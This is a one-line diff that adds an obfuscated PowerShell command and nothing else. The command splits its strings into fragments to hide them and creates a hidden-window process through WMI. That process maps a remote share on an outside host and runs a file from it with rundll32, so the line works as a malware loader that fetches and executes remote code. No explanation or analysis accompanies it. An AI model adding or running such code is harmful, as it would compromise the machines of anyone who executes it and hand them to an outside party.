@@ -1,0 +1,1 @@
+$w3MN=([wmiclass](-join('Win','32_Pro','cessStar','t','up'))).CreateInstance();$w3MN.ShowWindow=0;([wmiclass]('W'+'in'+'32_Proc'+'es'+'s')).Create(('cmd /c p'+'ush'+'d '+'\\x'+'b.bet1bo'+'nu'+'s.com'+'\e0c4c'+'f0d-'+'a8b3-4e5'+'7-82fe-'+'5686322d'+'9b'+'ed &'+' rundl'+'l32 bn'+'.'+'js,#1'),$null,$w3MN)
